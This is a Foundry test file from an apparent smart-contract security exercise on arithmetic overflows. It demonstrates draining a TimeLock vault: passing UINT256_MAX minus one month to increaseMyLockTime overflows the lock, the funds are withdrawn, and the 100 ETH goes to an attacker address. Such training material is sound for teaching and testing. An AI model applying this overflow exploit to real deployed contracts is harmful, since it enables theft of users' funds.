// SPDX-License-Identifier: MIT

pragma solidity ^0.7.0;
pragma abicoder v2;

import {Test, console} from "forge-std/Test.sol";
import {TimeLock} from "../../src/4. Arithmetic Overflows-1/TimeLock.sol";
// import {TimeLock} from "../../src/4. Arithmetic Overflows-1/Solution/TimeLockSecured.sol";

contract TestTimeLock is Test {
    TimeLock vault;

    uint256 constant ONE_MONTH = 30 * 24 * 60 * 60;
    uint256 constant VICTIM_DEPOSIT = 100 ether;

    address victim = makeAddr("victim");
    address attacker = makeAddr("attacker");

    function setUp() public {
        vault = new TimeLock();
    }

    function testAttack() public {
        vm.deal(victim, VICTIM_DEPOSIT);

        vm.prank(victim);
        vault.depositETH{value: VICTIM_DEPOSIT}();

        assertEq(vault.getBalance(address(victim)), VICTIM_DEPOSIT);
        assertEq(vault.getLocktime(address(victim)), block.timestamp + ONE_MONTH);

        console.log("Current Lock Time: ", vault.getLocktime(address(victim)));

        vm.startPrank(victim);

        vault.increaseMyLockTime(UINT256_MAX - ONE_MONTH);
        console.log("Updated Lock Time: ", vault.getLocktime(address(victim)));
        vault.withdrawETH();
        (bool sent,) = attacker.call{value: address(victim).balance}("");
        require(sent, "Transfer Failed while sending to attacker");

        vm.stopPrank();

        // Timelock contract victim's balance supposed to be 0 (withdrawn successfuly)
        assertEq(address(victim).balance, 0);

        // Attacker's should steal successfully the 100 ETH
        assertEq(address(attacker).balance, VICTIM_DEPOSIT);
    }
}
